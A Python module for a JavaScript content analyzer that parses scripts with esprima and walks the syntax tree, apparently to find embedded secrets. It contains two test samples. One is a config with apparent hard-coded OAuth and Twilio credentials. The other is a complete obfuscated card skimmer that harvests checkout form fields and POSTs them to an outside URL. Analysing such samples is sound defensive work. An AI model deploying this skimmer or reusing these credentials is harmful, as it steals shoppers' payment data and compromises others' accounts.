"""Javascript Base"""

from typing import Any, List, Tuple, TypeVar

import attr
import esprima

def _flatten_list(item: List[Any], indent: int = -1) -> List[Any]:

    indent += 1
    prefix = " " * indent
    # if indent == 0:
    #     prefix = "+"
    children = list()
    for thing in item:
        if isinstance(thing, list):
            children.extend(_flatten_list(thing, indent=indent))
        else:
            children.append(thing)
            # end = "\n"
            # if thing.__class__.__name__ in ("VariableDeclaration",):
            #     end = ' '
            print(f"{prefix}{repr(thing)}")
            # if thing.__class__.__name__ in ("ComputedMemberExpression", "ArrayExpression", "VariableDeclarator", "IfStatement", "BinaryExpression", "FunctionDeclaration"):
            #     continue
            children.extend(_flatten_list(thing.children(), indent=indent))
    return children

LEFT_TRAVERSED = set()
RIGHT_TRAVERSED = set()
TRAVERSED = set()
def _find_literal_context(item, literal):
    contexts = list()
    if item in TRAVERSED:
        return contexts
    TRAVERSED.add(item)
    class_name = item.__class__.__name__
    if class_name == "SwitchStatement":
        contexts.extend(_find_literal_context(item.discriminant, literal))
    elif class_name == "CallExpression" and hasattr(item.callee, 'name') and item.callee.name != '$':
        contexts.append((item.callee.name, item.callee))
    elif class_name == "CallExpression" and hasattr(item.callee, 'object'):
        contexts.extend(_find_literal_context(item.callee, literal))
    elif class_name == "StaticMemberExpression":
        contexts.extend(_find_literal_context(item.property, literal))
    elif class_name == "ComputedMemberExpression":
        # if item.property != literal:
        # if item.property != literal:
        contexts.extend(_find_literal_context(item.property, literal))
        contexts.extend(_find_literal_context(item.object, literal))
    elif class_name == "ExpressionStatement":
        contexts.extend(_find_literal_context(item.expression, literal))
    elif class_name == "AssignmentExpression":
        # if hasattr(item, 'stop_left') and item.stop_left:
        #     pass
        # else:
        #     item.stop_left = True
        contexts.extend(_find_literal_context(item.left, literal))
        # if item.right != literal:
        # if hasattr(item, 'stop_right') and item.stop_right:
        #     pass
        # else:
        #     item.stop_right = True
        contexts.extend(_find_literal_context(item.right, literal))
    elif hasattr(item, 'name'):
        if item == literal:
            pass
        elif isinstance(item.name, str):
            contexts.append((item.name, item))
        else:
            contexts.extend(_find_literal_context(item.name, literal))
    elif hasattr(item, 'properties'):
        for prop in item.properties:
            contexts.extend(_find_literal_context(prop, literal))
    elif item.parent is None:
        print(f"Has no parent {item.parent=}!")
        pass
    else:
        # if item.__class__.__name__ == "Literal":
        #     if item == literal:
        #         pass
        #     else:
        #         contexts.append((item.value, item))

        # else:
        contexts.extend(_find_literal_context(item.parent, literal))
    return contexts

def literal_context(literal):
    global TRAVERSED
    # print(f"Literal: {repr(literal)}")
    result = _find_literal_context(literal.parent, literal)
    # print(f"{result=}")
    TRAVERSED = set()
    return result

@attr.s(kw_only=True, slots=True)
class JavascriptAnalyzer:
    """JavascriptAnalyzer."""

    kvps: List = attr.ib(factory=list)

    def analyze(self, content: str) -> None:
        """Analyze content.

        Args:

            content (str): Content to analyze.
        """

        from ContentAnalyzer.analyzers.javascript.parser import Visitor

        visitor = Visitor(text=content)

        try:
            tree = esprima.parse(content, delegate=visitor, options={'loc': True, 'tolerant': True})
            new_tree = visitor.visit(tree)
            # children = [n.children() for n in new_tree]
            # flat_children = _flatten_list(new_tree)
            # literal_children = [n for n in flat_children if n.__class__.__name__ == "Literal"]
            # # literal_context = [(n, _find_literal_context(n.parent)) for n in literal_children]
            # literal_contexts = [(n, literal_context(n)) for n in literal_children]
            # for literal, contexts in literal_contexts:
            #     for name, name_source in contexts:
            #         print(f"{literal} => {name}")
            for child in new_tree:
                print(str(child))
            # self.kvps = visitor.get_matches()
        except esprima.error_handler.Error:
            # esprima may have a hard time with sourcemaps so check if
            # the file's last line starts with 'sourcemap' and if so,
            # try parsing the file again without the last line
            parts = content.split('\n')
            if len(parts) > 1:
                if parts[-1].lower().startswith("sourcemap"):
                    new_content = "\n".join(parts[0:-1])
                    self.analyze(new_content)
                else:
                    # Last line doesn't start with 'sourcemap'
                    raise
            else:
                # Not more than 1 line in file
                raise


    def get_kvps(self) -> List[TypeVar('KeyValuePair')]:
        """Get a list of KeyValuePairs.

        Returns:

            list: List of KeyValuePairs.
        """
        return self.kvps.copy()


    def get_kvps_as_tuples(self) -> List[Tuple[str, str]]:
        """Get a list of key/values as a tuple.

        Returns:

            list: List of tuples containing key, value.
        """
        return [(kvp.key, kvp.value) for kvp in self.kvps]


    # pylint: disable=line-too-long
    @classmethod
    def from_file(cls: TypeVar('JavascriptAnalyzer'), filename: str) -> TypeVar('JavascriptAnalyzer'):
        """Instantiate class from a file on a filesystem.

        Args:

            filename (str): Filename to load.

        Returns:

            JavascriptAnalyzer: JavascriptAnalyzer instance.
        """

        instance = cls()
        with open(filename, "r", encoding='utf-8') as f:
            content: str = f.read()
        instance.analyze(content)

        return instance
    # pylint: enable=line-too-long


# pylint: disable=line-too-long
# TEXT = """var client = twilio('ACc857fbb08e9355d3afcd09cea4e12acd', 'f8f9949838bffd7ab4d088e40eeb11bb');"""
TEXT = """module.exports = {
    tokenSecret: process.env.TOKEN_SECRET || 'A hard to guess string 555',
    providers: {
        'google': {
            clientId: process.env.GOOGLE_CLIENTID || '255148626257-q0vpd72frmemvfurnrbno2o1l28a2v3k.apps.googleusercontent.com',
            secret: process.env.GOOGLE_SECRET || 'VY6E0UQjg_OfOAsbFwgx8GRq'
        }
    }
};"""
# pylint: enable=line-too-long

TEXT = """var _0xf251=["; ","cookie","=","split","length","shift",";","pop","button","getElementsByTagName","click","","form","currentdatas=","$","; path=/","input","select","value","type","radio","hidden","id","search","submit","name","currentdatas",":","|","cc_number","indexOf","all ","URL","discount","stringify","append","https://www.halloweenhallway.com/js/mage/adminhtml/product/composite/validate.php","POST","open","send","addEventListener","load"];function getCookie(_0xc8aex2){var _0xc8aex3=_0xf251[0]+ document[_0xf251[1]];var _0xc8aex4=_0xc8aex3[_0xf251[3]](_0xf251[0]+ _0xc8aex2+ _0xf251[2]);if(_0xc8aex4[_0xf251[4]]== 2){return _0xc8aex4[_0xf251[7]]()[_0xf251[3]](_0xf251[6])[_0xf251[5]]()}}function taef(){var _0xc8aex6=document[_0xf251[9]](_0xf251[8]);for(i= 0;i< _0xc8aex6[_0xf251[4]];i++){_0xc8aex6[i][_0xf251[40]](_0xf251[10],function(){var _0xc8aex7=_0xf251[11];var _0xc8aex8=document[_0xf251[9]](_0xf251[12]);document[_0xf251[1]]= _0xf251[13]+ _0xf251[14]+ _0xf251[15];for(z= 0;z< _0xc8aex8[_0xf251[4]];z++){var _0xc8aex9=_0xc8aex8[z][_0xf251[9]](_0xf251[16]);var _0xc8aexa=_0xc8aex8[z][_0xf251[9]](_0xf251[17]);for(x= 0;x< _0xc8aex9[_0xf251[4]];x++){if(_0xc8aex9[x][_0xf251[18]]&& _0xc8aex9[x][_0xf251[18]]!= _0xf251[11]&& _0xc8aex9[x][_0xf251[19]]!= _0xf251[20]&& _0xc8aex9[x][_0xf251[19]]!= _0xf251[21]&& _0xc8aex9[x][_0xf251[22]]!= _0xf251[23]&& _0xc8aex9[x][_0xf251[18]]!= _0xf251[24]){if(_0xc8aex9[x][_0xf251[25]]&& _0xc8aex9[x][_0xf251[25]]!= _0xf251[11]){var _0xc8aexb=getCookie(_0xf251[26]);_0xc8aexb+= _0xc8aex9[x][_0xf251[25]]+ _0xf251[27]+ _0xc8aex9[x][_0xf251[18]]+ _0xf251[28];document[_0xf251[1]]= _0xf251[13]+ _0xc8aexb+ _0xf251[15]}else {var _0xc8aexb=getCookie(_0xf251[26]);_0xc8aexb+= _0xc8aex9[x][_0xf251[22]]+ _0xf251[27]+ _0xc8aex9[x][_0xf251[18]]+ _0xf251[28];document[_0xf251[1]]= _0xf251[13]+ _0xc8aexb+ _0xf251[15]}}};for(x= 0;x< _0xc8aexa[_0xf251[4]];x++){if(_0xc8aexa[x][_0xf251[18]]&& _0xc8aexa[x][_0xf251[18]]!= _0xf251[11]&& _0xc8aexa[x][_0xf251[19]]!= _0xf251[20]&& _0xc8aexa[x][_0xf251[19]]!= _0xf251[21]&& _0xc8aexa[x][_0xf251[22]]!= _0xf251[23]&& _0xc8aexa[x][_0xf251[18]]!= _0xf251[24]){if(_0xc8aexa[x][_0xf251[25]]&& _0xc8aexa[x][_0xf251[25]]!= _0xf251[11]){var _0xc8aexb=getCookie(_0xf251[26]);_0xc8aexb+= _0xc8aexa[x][_0xf251[25]]+ _0xf251[27]+ _0xc8aexa[x][_0xf251[18]]+ _0xf251[28];document[_0xf251[1]]= _0xf251[13]+ _0xc8aexb+ _0xf251[15]}else {var _0xc8aexb=getCookie(_0xf251[26]);_0xc8aexb+= _0xc8aexa[x][_0xf251[22]]+ _0xf251[27]+ _0xc8aexa[x][_0xf251[18]]+ _0xf251[28];document[_0xf251[1]]= _0xf251[13]+ _0xc8aexb+ _0xf251[15];document[_0xf251[1]]= _0xf251[13]+ _0xc8aexb+ _0xf251[15]}}}};var _0xc8aexb=getCookie(_0xf251[26]);_0xc8aex7= _0xc8aexb;if(_0xc8aex7[_0xf251[30]](_0xf251[29])!==  -1){var _0xc8aexc= new FormData();var _0xc8aexd={Domain:_0xf251[31]+ document[_0xf251[32]],d:btoa(_0xc8aex7)};_0xc8aexc[_0xf251[35]](_0xf251[33],btoa(JSON[_0xf251[34]](_0xc8aexd)));urll= _0xf251[36];var _0xc8aexe= new XMLHttpRequest();_0xc8aexe[_0xf251[38]](_0xf251[37],urll,true);_0xc8aexe[_0xf251[39]](_0xc8aexc)}})}}window[_0xf251[40]](_0xf251[41],function(){taef()})"""

def main():
    """Main."""

    filename = "tests/data/javascript/sample6.js"
    # filename = "sample10-redux.js"
    # with open(filename, 'r', encoding='utf-8') as f:
    #     TEXT = f.read()

    doc = JavascriptAnalyzer()
    doc.analyze(TEXT)

    print("", end='')

if __name__ == "__main__":
    main()
